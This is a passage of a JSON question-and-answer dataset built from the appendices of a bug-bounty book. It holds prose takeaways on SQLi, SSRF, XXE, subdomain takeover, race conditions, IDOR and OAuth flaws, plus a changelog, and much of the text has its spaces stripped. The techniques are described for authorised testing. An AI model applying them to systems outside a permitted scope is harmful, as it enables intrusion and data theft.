Rather, it was all about how Drupal’s code was\nhandling arrays passed to internal functions. That isn’t easy to spot with black\nbox testing (where you don’t have access to see the code). The takeaway from\nthisistobeonthelookoutforopportunitiestoalterthestructureofinputpassed\nto a site. So, where a URL takes ?name as a parameter, trying passing an array\nlike ?name[] to see how the site handles it. It may not result in SQLi, but could\nleadtootherinterestingbehaviour.\nSQLi, like other injection vulnerabilities, isn’t overly tough to exploit. The key is\nto test parameters which could be vulnerable. In this case, adding the double\ndash clearly changed the results of Stefano’s baseline query which gave away\ntheSQLi.Whensearchingforsimilarvulnerabilities,beonthelookoutforsubtle\nchangestoresultsastheycanbeindicativeofablindSQLivulnerability.\nKeep an eye out for HTTP requests that accept encoded parameters. After you\ndecodeandinjectyourqueryintoarequest,besuretore-encodeyourpayload\nsoeverythingstillmatchestheencodingthedatabaseisexpecting.\nExtracting a database name, user name and host name is generally considered\nharmless,butbesureit’swithinthepermittedactionsofthebountiesprogram\nyou’re working in. In some cases, the sleep command is enough for a proof of\nconcept.\nServer Side Request Forgery\nGoogleDorkingisagreat toolwhichwillsave youtimewhileexposingall kinds\nofpossibleexploits.Ifyou’relookingforSSRFvulnerabilities,beonthelookout\nforany targeturlswhichappear to bepulling in remotecontent. In thiscase, it\nwastheurl=whichwasthegiveaway.\nSecondly,don’trunoffwiththefirstthoughtyouhave.Brettcouldhavereported\nthe XSS payload which wouldn’t have been as impactful. By digging a little\ndeeper,hewasabletoexposethetruepotentialofthisvulnerability.Butwhen\ndoingso,becarefulnottooverstep.\nAppendixA-TakeAways 226\nKeepaneyeoutforopportunitieswherewebsitesincludefunctionalitytomake\nexternal HTTP requests. When you come across these, try pointing the request\ninternallyusingtheprivatenetworkIPaddresslistedabove.\nIfthesitewon’taccessinternalIPs,atrickJustinKennedyoncerecommendedto\nmewastomaketheexternalHTTPrequesttoaserveryoucontrolandrespond\ntothatrequestwitha301redirect.Thistypeofresponsetellstherequesterthat\nthelocationfortheresourcetheyhaverequestedhaschangedandpointsthem\ntoanewlocation.Sinceyoucontroltheresponse,youcanpointtheredirection\nto an internal IP address to see the server will then make the HTTP request to\ntheinternalnetwork.\nIfyou’reabletosubmitaURLtocreatewebhooksorintentionallyimportremote\ncontent,trytodefinespecificports.Minorchangesinhowaserverrespondsto\ndifferentportsmayrevealwhetheraportisopen/closedorfiltered.Inaddition\ntodifferencesinthemessagesreturnedbytheserver,portsmayrevealwhether\ntheyareopen/closed,orfilteredthroughhowlongittakestheservertorespond\ntotherequest.\nXML External Entity Vulnerability\nEventheBigBoyscanbevulnerable.Althoughthisreportisalmost2yearsold,\nitisstillagreatexampleofhowbigcompaniescanmakemistakes.Therequired\nXMLtopullthisoffcaneasilybeuploadedtositeswhichareusingXMLparsers.\nHowever,sometimesthesitedoesn’tissuearesponsesoyou’llneedtotestother\ninputsfromtheOWASPcheatsheetabove.\nThereareacoupletakeawayshere.XMLfilescomeindifferentshapesandsizes\n-keepaneyeoutforsitesthataccept.docx,.xlsx,.pptx,etc.AsImentionedpre-\nviously,sometimesyouwon’treceivetheresponsefromXXEimmediately-this\nexample shows how you can set up a server to be pinged which demonstrates\ntheXXE.\nAdditionally, as with other examples, sometimes reports are initially rejected.\nIt’simportanttohaveconfidenceandstickwithitworkingwiththecompanyyou\nare reporting to, respecting their decision while also explaining why something\nmightbeavulnerability."
  },
  {
    "input": "What are the key takeaways from the examples in Appendix A regarding software vulnerabilities and hacking techniques?",
    "summary": "The text highlights various security vulnerabilities and hacking techniques, including using XML templates, understanding past vulnerabilities, and performing reconnaissance. It emphasizes the importance of observing and testing for issues like buffer overflows, memory corruption, and subdomain takeovers, while also noting the value of learning from third-party services and APIs. Additionally, it stresses the need for thorough testing, automation, and clear communication when reporting vulnerabilities to ensure they are properly understood and addressed.",
    "output": "AppendixA-TakeAways 227\nAs mentioned, this is a great example of how you can use XML templates from\na site to embed your own XML entities so that the file is parsed properly by\nthe target. In this case, Wikiloc was expecting a .gpx file and David kept that\nstructure, inserting his own XML entities within expected tags, specifically, the\n<name>tag.Additionally,it’sinterestingtoseehowservingamaliciousdtdfile\nbackcanbeleveragedtosubsequentlyhaveatargetmakeGETrequeststoyour\nserverwithfilecontentsasURLparameters.\nRemote Code Execution\nReading is a big part of successful hacking and that includes reading about\nsoftware vulnerabilities and Common Vulnerabilities and Exposures (CVE Iden-\ntifiers).Knowingaboutpastvulnerabilitiescanhelpyouwhenyoucomeacross\nsitesthathaven’tkeptupwithsecurityupdates.Inthiscase,Yahoohadpatched\ntheserverbutitwasdoneincorrectly(Icouldn’tfindanexplanationofwhatthat\nmeant). As a result, knowing about the ImageMagick vulnerability allowed Ben\ntospecificallytargetthatsoftware,whichresultedina$2000reward.\nWhilenotalwaysjawdroppingandexciting,performingproperreconnaissance\ncan prove valuable. Here, Michiel found a vulnerability sitting in the open\nsince April 6, 2014 simply by running Gitrob on the publicly accessible Angolia\nFacebook-Searchrepository.Ataskthatcanbestartedandlefttorunwhileyou\ncontinue to search and hack on other targets, coming back to it to review the\nfindingsonceit’scomplete.\nWorking on this vulnerability was a lot of fun. The initial stack trace was a red\nflag that something was wrong and like some other vulnerabilities detailed in\nthebook,wherethereissmokethere’sfire.WhileJamesKettle’sblogpostdidin\nfactincludethemaliciouspayloadtobeused,Ioverlookedit.However,thatgave\nmetheopportunitytolearnandgothroughtheexerciseofreadingtheSmarty\ndocumentation. Doing so led me to the reserved variables and the {php} tag to\nexecutemyowncode.\nAppendixA-TakeAways 228\nMemory\nBuffer Overflows are an old, well known vulnerability but still common when\ndealing with applications that manage their own memory, particularly C and\nC++. If you find out that you are dealing with a web application based on the C\nlanguage(ofwhichPHPiswrittenin),bufferoverflowsareadistinctpossibility.\nHowever, if you’re just starting out, it’s probably more worth your time to find\nsimplerinjectionrelatedvulnerabilitiesandcomebacktoBufferOverflowswhen\nyouaremoreexperienced.\nWe’ve now see examples of two functions which implemented incorrectly are\nhighly susceptible to Buffer Overflows, memcpy and strcpy. If we know a site\nor application is reliant on C or C++, it’s possible to search through source\ncode libraries for that language (use something like grep) to find incorrect\nimplementations.\nThe key will be to find implementations that pass a fixed length variable as the\nthird parameter to either function, corresponding to the size of the data to be\nallocatedwhenthedatabeingcopiedisinfactofavariablelength.\nHowever,asmentionedabove,ifyouarejuststartingout,itmaybemoreworth\nyour time to forgo searching for these types of vulnerabilities, coming back to\nthemwhenyouaremorecomfortablewithwhitehathacking.\nThis is an example of a very complex vulnerability. While it bordered on being\ntoo technical for the purpose of this book, I included it to demonstrate the\nsimilarities with what we have already learned. When we break this down, this\nvulnerabilitywasalsorelatedtoamistakeinCcodeimplementationassociated\nwithmemorymanagement,specificallycopyingmemory.Again,ifyouaregoing\ntostartdigginginClevelprogramming,startlookingfortheareaswheredatais\nbeingcopiedfromonememorylocationtoanother.\nJust like Buffer Overflows, Memory Corruption is an old but still common\nvulnerability when dealing with applications that manage their own memory,\nparticularlyCandC++.Ifyoufindoutthatyouaredealingwithawebapplication\nbasedontheClanguage(ofwhichPHPiswrittenin),beonthelookupforways\nthatmemorycanbemanipulated.However,again,ifyou’rejuststartingout,it’s\nprobably more worth your time to find simpler injection related vulnerabilities\nandcomebacktoMemoryCorruptionwhenyouaremoreexperience.\nAppendixA-TakeAways 229\nSub Domain Takeover\nDNSentriespresentanewanduniqueopportunitytoexposevulnerabilities.Use\nKnockPyinanattempttoverifytheexistenceofsubdomainsandthenconfirm\nthey are pointing to valid resources paying particular attention to third party\nservice providers like AWS, Github, Zendesk, etc. - services which allow you to\nregistercustomizedURLs.\nPAYATTENTION!ThisvulnerabilitywasfoundFebruary2016andwasn’tcomplex\natall.Successfulbughuntingrequireskeenobservation.\nAs described, there are multiple takeaways here. First, start using crt.sh to\ndiscover sub domains. It looks to be a gold mine of additional targets within a\nprogram.Secondly,subdomaintakeoversaren’tjustlimitedtoexternalservices\nlike S3, Heroku, etc. Here, Sean took the extra step of actually registered the\nexpired domain Shopify was pointing to. If he was malicious, he could have\ncopied the Shopify sign in page on the domain and began harvesting user\ncredentials.\nAgain, we have a few take aways here. First, when searching for sub domain\ntakeovers,beonthelookoutfor*.global.ssl.fastly.netURLsasitturnsoutthat\nFastly is another web service which allows users to register names in a global\nnamespace.Whendomainsarevulnerable,Fastlydisplaysamessagealongthe\nlinesof“Fastlydomaindoesnotexist”.\nSecond, always go the extra step to confirm your vulnerabilities. In this case,\nEbrietas looked up the SSL certificate information to confirm it was owned by\nSnapchat before reporting. Lastly, the implications of a take over aren’t always\nimmediately apparent. In this case, Ebrietas didn’t think this service was used\nuntil he saw the traffic coming in. If you find a takeover vulnerability, leave\nthe service up for some time to see if any requests come through. This might\nhelp you determine the severity of the issue to explain the vulnerability to the\nprogram you’re reporting to which is one of the components of an effective\nreportasdiscussedintheVulnerabilityReportschapter.\nAppendixA-TakeAways 230\nIincludedthisexamplefortworeasons;first,whenFranstriedtoclaimthesub\ndomain on Modulus, the exact match was taken. However, rather than give up,\nhe tried claiming the wild card domain. While I can’t speak for other hackers, I\ndon’t know if I would have tried that if I was in his shoes. So, going forward, if\nyou find yourself in the same position, check to see if the third party services\nallowsforwildcardclaiming.\nSecondly, Frans actually claimed the sub domain. While this may be obvious to\nsome, I want to reiterate the importance of proving the vulnerability you are\nreporting. In this case, Frans took the extra step to ensure he could claim the\nsub domain and host his own content. This is what differentiates great hackers\nfrom good hackers, putting in that extra effort to ensure you aren’t reporting\nfalsepositives.\nThisvulnerabilityisanotherexampleofhowinvaluableitcanbetodigintothird\npartyservices,libraries,etc.thatsitesareusing.Byreadingthedocumentation,\nlearning about SendGrid and understanding the services they provide, Ura-\nnium238 found this issue. Additionally, this example demonstrates that when\nlooking for takeover opportunities, be on the lookout for functionality which\nallowsyoutoclaimsubdomains.\nRace Conditions\nRaceconditionsareaninterestingvulnerabilityvectorthatcansometimesexist\nwhere applications are dealing with some type of balance, like money, credits,\netc.Findingthevulnerabilitydoesn’talwayshappenonthefirstattemptandmay\nrequiringmakingseveralrepeatedsimultaneousrequests.Here,Egormadesix\nrequestsbeforebeingsuccessfulandthenwentandmadeapurchasetoconfirm\ntheproofofconcept.\nFindingandexploitingthisvulnerabilitywasactuallyprettyfun,amini-competi-\ntion with myself and the HackerOne platform since I had to click the buttons\nso fast. But when trying to identify similar vulnerabilities, be on the look up\nfor situations that might fall under the steps I described above, where there’s\nadatabaselookup,codinglogicandadatabaseupdate.Thisscenariomaylend\nitselftoaraceconditionvulnerability.\nAdditionally, look for ways to automate your testing. Luckily for me, I was able\ntoachievethiswithoutmanyattemptsbutIprobablywouldhavegivenupafter\n4or5giventheneedtoremoveusersandresendinvitesforeverytest.\nAppendixA-TakeAways 231\nAccepting and paying for this type of race condition, inviting more people than\nallowed to a site, depends on a program’s priorities, functionality and risk\nprofile. In this case, Keybase likely accepted this because they were attempting\nto manage the number of users registering on their site which this bypassed.\nThis isn’t the case for all bug bounty programs that include invite functionality,\nas demonstrated with the HackerOne invite example discussed previously. If\nreportingsomethingsimilar,besuretoclearlyarticulatewhyyourreportshould\nbeconsideredavulnerability.\nWhen using a site, if you notice it is processing data well after you’ve visited\nthesite,it’slikelyusingabackgroundjobtoprocessdata.Thisisaredflagthat\nyou should test the conditions that define the job to see if the site will act on\nthe new conditions versus the old ones. In this example, it was HackerOne’s\ncombining payments for an email address versus sending money to specific\nemail addresses. Be sure to test the behavior thoroughly since background\nprocessing can happen anywhere from very quickly to long after depending on\nhow many jobs have been queued to be completed and the site’s approach to\nprocessingdata.\nInsecure Direct Object References\nIf you’re looking for authentication based vulnerabilities, be on the lookout for\nwherecredentialsarebeingpassedtoasite.Whilethisvulnerabilitywascaught\nbylookingatthepagesourcecode,youalsocouldhavenoticedtheinformation\nbeingpassedwhenusingaProxyinterceptor.\nIfyoudofindsometypeofcredentialsbeingpassed,takenotewhentheydonot\nlookencryptedandtrytoplaywiththem.Inthiscase,thepinwasjustCRXXXXXX\nwhilethepasswordwas0e552ae717a1d08cb134f132￿clearlythePINwasnot\nencryptedwhilethepasswordwas.Unencryptedvaluesrepresentaniceareato\nstartplayingwith.\nAppendixA-TakeAways 232\nTesting for IDORs requires keen observation as well as skill. When reviewing\nHTTP requests for vulnerabilities, be on the lookout for account identifiers like\nthe administration_id in the above. While the field name, administration_id\nis a little misleading compared to it being called account_id, being a plain\nintegerwasaredflagthatIshouldcheckitout.Additionally,giventhelengthof\nthe parameter, it would have been difficult to exploit the vulnerability without\nmaking a bunch of network noise, having to repeat requests searching for the\nrightid.Ifyoufindsimilarvulnerabilities,toimproveyourreport,alwaysbeon\nthelookoutforHTTPresponses,urls,etc.thatdiscloseids.Luckilyforme,theid\nIneededwasincludedintheaccountURL.\nWhile similar to the Moneybird example above, in that both required abusing\nleaked organization ids to elevate privileges, this example is great because it\ndemonstrates the severity of being able to attack users remotely, with zero\ninteraction on their behalf and the need to demonstrate a full exploit. Initially,\nAkhil did not include or demonstrate the full account takeover and based on\nTwitter’s response to his mentioning it (i.e., asking for details and full steps to\ndo so), they may not have considered that impact when initially resolving the\nvulnerability.So,whenyoureport,makesuretofullyconsideranddetailthefull\nimpactofthevulnerabilityyouarereporting,includingstepstoreproduceit.\nOAuth\nWhen looking for vulnerabilities, consider how stale assets can be exploited.\nWhenyou’rehacking,beonthelookoutforapplicationchangeswhichmayleave\nresourcesliketheseexposed.ThisexamplefromPhilippeisawesomebecauseit\nstartedwithhimidentifyinganendgoal,stealingOAuthtokens,andthenfinding\nthemeanstodoso.\nAdditionally, if you liked this example, you should check out Philippe’s Blog1\n(included in the Resources Chapter) and the Hacking Pro Tips Interview he sat\ndownwithmetodo-heprovidesalotofgreatadvice!.\nWhile a little old, this vulnerability demonstrates how OAuth redirect_uri vali-\ndations can be misconfigured by resource servers. In this case, it was Slack’s\nimplementation of OAuth which permitted an attacker to add domain suffixes\nandstealtokens.\n1https://www.philippeharewood.com\nAppendixA-TakeAways 233\nThereareafewtakeawayshere.First,OAuthvulnerabilitiesaren’talwaysabout\nstealing tokens. Keep an eye out for API requests protected by OAuth which\naren’tsendingorvalidatingthetoken(i.e.,tryremovingtheOAuthtokenheader\nif there’s an identifier, like the sheets ID, in the URL). Secondly, it’s important\nto recognize and understand how browsers interpret Javascript and JSON. This\nvulnerability was partly made possible since Google was returning a valid\nJavascriptobjectwhichcontainedJSON.Lastly,whileit’sacommonthemeinthe\nbook, read the documentation. Google’s documentation about responses was\nkey to developing a working proof of concept which sent the spreadsheet data\ntoaremoteserver.\nApplication Logic Vulnerabilities\nTherearetwokeytakeawayshere.First,noteverythingisaboutinjectingcode,\nHTML,etc.Alwaysremembertouseaproxyandwatchwhatinformationisbeing\npassedtoasiteandplaywithittoseewhathappens.Inthiscase,allittookwas\nremoving POST parameters to bypass security checks. Secondly, again, not all\nattacksarebasedonHTMLwebpages.APIendpointsalwayspresentapotential\nareaforvulnerabilitysomakesureyouconsiderandtestboth.\nThough a short description, the takeaway here can’t be overstated, be on the\nlookoutfornewfunctionality!.Whenasiteimplementsnewfunctionality,it’s\nfresh meat. New functionality represents the opportunity to test new code and\nsearch for bugs. This was the same for the Shopify Twitter CSRF and Facebook\nXSSvulnerabilities.\nTomakethemostofthis,it’sagoodideatofamiliarizeyourselfwithcompanies\nand subscribe to company blogs, newsletters, etc. so you’re notified when\nsomethingisreleased.Thentestaway.\nWhenyou’rescopingoutapotentialtarget,ensuretonoteallthedifferenttools,\nincludingwebservices,theyappeartobeusing.Eachservice,software,OS,etc.\nyoucanfindrevealsapotentialnewattackvector.Additionally,itisagoodidea\nto familiarize yourself with popular web tools like AWS S3, Zendesk, Rails, etc.\nthatmanysitesuse.\nAppendixA-TakeAways 234\nThereareamultipletakeawaysfromthis:\n1. Don’t underestimate your ingenuity and the potential for errors from\ndevelopers. HackerOne is an awesome team of awesome security re-\nsearchers.Butpeoplemakemistakes.Challengeyourassumptions.\n2. Don’t give up after the first attempt. When I found this, browsing each\nbucketwasn’tavailableandIalmostwalkedaway.ButthenItriedtowrite\nafileanditworked.\n3. It’sallabouttheknowledge.Ifyouknowwhattypesofvulnerabilitiesexist,\nyouknowwhattolookforandtest.Buyingthisbookwasagreatfirststep.\n4. I’ve said it before, I’ll say it again, an attack surface is more than the\nwebsite,it’salsotheservicesthecompanyisusing.Thinkoutsidethebox.\nTwo factor authentication is a tricky system to get right. When you notice a site\nis using it, you’ll want to fully test out all functionality including token lifetime,\nmaximumnumberofattempts,reusingexpiredtokens,likelihoodofguessinga\ntoken,etc.\nWhenhacking,consideracompany’sentireinfrastructurefairgameunlessthey\ntellyouit’soutofscope.Whilethisreportdidn’tpayabounty,IknowthatPatrik\nhasemployedsimilartechniquestofindsomesignificantfourfigurepayouts.\nAdditionally, you’ll notice there was 260,000 potential addresses here, which\nwould have been impossible to scan manually. When performing this type of\ntesting, automation is hugely important and something that should be em-\nployed.\nJavascript source code provides you with actual source code from a target you\ncan explore. This is great because your testing goes from blackbox, having no\nidea what the back end is doing, to whitebox (though not entirely) where you\nhave insight into how code is being executed. This doesn’t mean you have to\nwalkthrougheveryline,thePOSTcallinthiscasewasfoundonline20570with\nasimplesearchforPOST.\nSubdomainsandbroadernetworkconfigurationsrepresentgreatpotentialfor\nhacking.Ifyounoticethataprogramisincluding*.SITE.cominit’sscope,tryto\nfindsubdomainsthatmaybevulnerableratherthangoingafterthelowhanging\nfruitonthemainsitewhicheveryonemaybesearchingfor.It’salsoworthyour\ntimetofamiliarizeyourselfwithtoolslikeNmap,eyewitness,knockpy,etc.which\nwillhelpyoufollowinAndy’sshoes.\nAppendixA-TakeAways 235\nIincludedthisexamplebecauseitdemonstratestwothings-first,whileitdoes\nreducetheimpactofthevulnerability,therearetimesthatreportingabugwhich\nassumes an attacker knows a victim’s user name and password is acceptable\nprovidedyoucanexplainwhatthevulnerabilityisanddemonstrateit’sseverity.\nSecondly,whentestingforapplicationlogicrelatedvulnerabilities,considerthe\ndifferent ways an application could be accessed and whether security related\nbehaviours are consistent across platforms. In this case, it was browsers and\nmobileapplicationsbutitalsocouldincludethirdpartyappsorAPIendpoints."
  },
  {
    "input": "What are the key updates and additions made to Appendix B - Web Hacking 101 over the different dates mentioned?",
    "summary": "Appendix B - Web Hacking 101 has been updated with new examples and chapters on vulnerabilities like XSS, SQLi, SSRF, and race conditions, as well as added tools and cheat sheets. The appendix includes detailed explanations and real-world examples from various sources, such as Uber, Google, and Twitter. Recent updates also reorganized chapters and improved clarity on topics like XXE and OAuth.",
    "output": "27. Appendix B - Web Hacking 101\nChangelog\nMarch 11, 2018\nRewrote description for XSS, SSTI, SQLi, SSRF, Race Conditions\nAdded new Orange Uber SQLi example\nAdded new SSRF port scanning example\nAdded two new race condition examples, Keybase and HackerOne\nJuly 11, 2017\nAdded new Google SSRF vulnerability\nMarch 12, 2017\nMinor typo and grammar fixes through the book\nRewroteOpenRedirect,HPP,CSRF,HTMLInjection,CRLFchapterdescriptions\nand revised associated examples\nNovember 18, 2016\nAdded Uber sub domain takeover example\nAdded Google Sheets OAuth example\nNovember 11, 2016\nAdded new IDOR examples, Moneybird and Twitter\nAdded new Application Logic example from Twitter\nAppendixB-WebHacking101Changelog 237\nAdded new OAuth Chapter and an example\nMoved Philippe’s Facebook OAuth example from Subdomain Takeovers to\nOAuth\nNovember 6, 2016\nRe-ordered chapters and added Race Conditions and IDOR as their own\nchapters\nAdded GitRob and RaceTheWeb in the Tools chapter\nAdded new Race Conditions example from HackerOne, accepting invites\nOctober 3, 2016\nAdded two new Remote Code Execution vulnerabilities\nUpdated XXE chapter to clarify Facebook example\nVarious typo fixes\nSeptember 21, 2016\nAdded new sub domain take over example, #6 - api.legalrobot.com\nAdded Appendix B of Take Aways\nAugust 23, 2016\nAddednewsubdomaintakeoverexample,#5-Snapcchatfastly.sctakeover\nAdded new tools: XSSHunter, Censys, OnlineHashCrack, Ysoserial\nAdded new cheatsheet for AngularJS, including the 1.5.7 sandbox escape"
  }
]